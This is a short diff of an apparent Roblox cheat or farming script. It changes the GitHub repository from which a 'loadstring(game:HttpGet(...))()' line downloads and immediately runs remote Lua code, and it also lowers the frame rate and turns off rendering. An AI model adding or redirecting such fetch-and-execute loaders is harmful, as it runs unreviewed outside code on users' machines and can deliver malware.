@@ -483,7 +483,7 @@ getgenv().gag2_config = {
     webhook_url = "",
 }
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Reversed1337/Testing-123/refs/heads/main/zeta%20hub.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/doraimon0/xexellent/refs/heads/main/zeta%20hub.lua"))()
 setfpscap(5)
 local RunService = game:GetService("RunService")
 RunService:Set3dRenderingEnabled(false)
